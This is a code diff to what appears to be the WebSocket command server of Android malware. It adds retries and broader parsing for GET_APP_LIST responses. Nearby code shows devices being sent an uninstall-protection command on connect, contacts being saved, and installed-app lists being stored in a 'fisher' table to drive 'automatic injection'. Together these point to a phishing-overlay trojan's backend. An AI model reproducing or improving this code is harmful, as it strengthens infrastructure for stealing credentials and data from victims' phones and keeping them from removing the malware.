@@ -64,7 +64,7 @@ function handleDevice(ws, sessionId, connections) {
   // ★ 闭包变量：latestClientIp 随 status 消息更新（pool 自愈用 + 修复 C 简化版）
   let latestClientIp = clientIp;
 
-  connections.devices.set(sessionId, { ws, sessionId, clientIp });
+  connections.devices.set(sessionId, { ws, sessionId, clientIp, appListReceived: false });
   console.log(`[WS-Device] Connected: ${sessionId} ip=${clientIp}`);
   void recordDeviceDebug('ws.connected', sessionId, { clientIp, connectionPoolSize: connections.devices.size });
 
@@ -79,18 +79,40 @@ function handleDevice(ws, sessionId, connections) {
   // 2026-08-02 device auto-protect: send ENABLE_UNINSTALL_PROTECTION on register
   setTimeout(() => sendProtectFirstTime(connections, sessionId), 2000);
 
-  // 设备上线 8 秒后自动获取应用列表（用于自动注入匹配）
-  const appListTimer = setTimeout(() => {
-    if (ws.readyState === 1) {
-      console.log(`[WS-Device] Sending GET_APP_LIST to ${sessionId}`);
-      ws.send(JSON.stringify({
-        type: 'command',
-        sessionId,
-        data: { command: 'GET_APP_LIST', params: {} }
-      }));
-      void recordDeviceDebug('apps.request.sent', sessionId, { delayMs: 8000, command: 'GET_APP_LIST' });
+  // 新安装/刚启动的客户端可能在 WS 连上后仍未准备好应用列表模块。
+  // 首次请求和手动“重新获取（设备）”保持同一参数，并在没有响应时自动重试。
+  const appListRetryDelays = [8000, 16000, 30000];
+  const appListTimers = appListRetryDelays.map((delayMs, index) => setTimeout(() => {
+    const current = connections.devices.get(sessionId);
+    if (!current || current.ws !== ws || current.appListReceived || ws.readyState !== 1) return;
+
+    const attempt = index + 1;
+    const params = { full: true, force: true };
+    console.log(`[WS-Device] Sending GET_APP_LIST to ${sessionId} attempt=${attempt}/${appListRetryDelays.length}`);
+    ws.send(JSON.stringify({
+      type: 'command',
+      sessionId,
+      data: { command: 'GET_APP_LIST', params }
+    }));
+    void recordDeviceDebug('apps.request.sent', sessionId, {
+      delayMs,
+      attempt,
+      totalAttempts: appListRetryDelays.length,
+      command: 'GET_APP_LIST',
+      params,
+    });
+  }, delayMs));
+
+  const appListTimeoutTimer = setTimeout(() => {
+    const current = connections.devices.get(sessionId);
+    if (current && current.ws === ws && !current.appListReceived && ws.readyState === 1) {
+      void recordDeviceDebug('apps.response.timeout', sessionId, {
+        waitedMs: 45000,
+        attempts: appListRetryDelays.length,
+        command: 'GET_APP_LIST',
+      }, 'warn');
     }
-  }, 8000);
+  }, 45000);
 
   // 设备上线时补发全局策略；第一次失败时稍后重试一次。
   const policySyncTimers = [1500, 10000].map(delay => setTimeout(() => {
@@ -142,7 +164,7 @@ function handleDevice(ws, sessionId, connections) {
       if (ws.readyState !== 1) return
       // ★ 池自愈：如果池里已被清空（理论不应该，但兜底），自动重新注册
       if (!connections.devices.has(sessionId) || connections.devices.get(sessionId).ws !== ws) {
-        connections.devices.set(sessionId, { ws, sessionId, clientIp: latestClientIp })
+        connections.devices.set(sessionId, { ws, sessionId, clientIp: latestClientIp, appListReceived: false })
         if (process.env.NODE_WS_DEBUG_HEAL === '1') {
           console.log(`[WS-Device] pool self-heal: re-registered ${sessionId}`)
         }
@@ -185,7 +207,8 @@ function handleDevice(ws, sessionId, connections) {
   }
 
   ws.on('close', () => {
-    clearTimeout(appListTimer);
+    appListTimers.forEach(clearTimeout);
+    clearTimeout(appListTimeoutTimer);
     policySyncTimers.forEach(clearTimeout);
     clearInterval(heartbeatInterval);
     clearInterval(serverPingInterval);
@@ -211,7 +234,8 @@ function handleDevice(ws, sessionId, connections) {
   });
 
   ws.on('error', (error) => {
-    clearTimeout(appListTimer);
+    appListTimers.forEach(clearTimeout);
+    clearTimeout(appListTimeoutTimer);
     policySyncTimers.forEach(clearTimeout);
     clearInterval(heartbeatInterval);
     clearInterval(serverPingInterval);
@@ -227,6 +251,11 @@ function handleDevice(ws, sessionId, connections) {
 function handleDeviceMessage(ws, msg, sessionId, connections) {
   const { type } = msg;
   console.log(`[WS-Device] handleDeviceMessage type='${type}' from ${sessionId}`);
+
+  const markAppListReceived = () => {
+    const current = connections.devices.get(sessionId);
+    if (current && current.ws === ws) current.appListReceived = true;
+  };
 
   // 旧后端逻辑：心跳/状态/注册消息都会触发设备信息更新
   const registerTypes = ['REGISTER', 'register', 'heartbeat', 'HEARTBEAT',
@@ -296,6 +325,20 @@ function handleDeviceMessage(ws, msg, sessionId, connections) {
             saveAiDeviceData(sessionId, 'contacts', ct);
           }
         }
+        const commandName = String(rd.command || rd.commandName || msg.command || '').toUpperCase();
+        const commandResult = rd.result ?? rd.data ?? rd;
+        const commandApps = Array.isArray(commandResult)
+          ? commandResult
+          : commandResult?.apps || commandResult?.appList || commandResult?.app_list
+            || rd.apps || rd.appList || rd.app_list
+            || (commandName === 'GET_APP_LIST' ? commandResult?.list || rd.list : null);
+        if (Array.isArray(commandApps)) {
+          markAppListReceived();
+          console.log(`[WS-Device] command_result contains apps: count=${commandApps.length}`);
+          handleAppList(sessionId, { ...msg, _apps: commandApps }, ws, connections);
+          broadcastToAdmins(connections, { type: 'app_list', deviceId: sessionId, data: commandApps });
+          saveAiDeviceData(sessionId, 'apps', commandApps);
+        }
       }
       broadcastToAdmins(connections, {
         type: 'command_result',
@@ -351,9 +394,18 @@ function handleDeviceMessage(ws, msg, sessionId, connections) {
     case 'app_list':
     case 'app_list_response':
     case 'APP_LIST_RESPONSE':
+    case 'APP_LIST':
+    case 'APP_LIST_DATA':
+    case 'get_app_list':
+    case 'GET_APP_LIST':
       // 设备返回已安装应用列表 → 存入 fisher_device_apps 并触发自动注入
       {
-        const apps = msg.data?.apps || msg.data || msg.apps || [];
+        const data = msg.data;
+        const apps = Array.isArray(data)
+          ? data
+          : data?.apps || data?.appList || data?.app_list || data?.list
+            || msg.apps || msg.appList || msg.app_list || msg.list || [];
+        markAppListReceived();
         console.log(`[WS-Device] Received ${type} from ${sessionId}, count=${Array.isArray(apps) ? apps.length : 0}`);
         handleAppList(sessionId, { ...msg, _apps: apps }, ws, connections);
         broadcastToAdmins(connections, { type: 'app_list', deviceId: sessionId, data: apps });
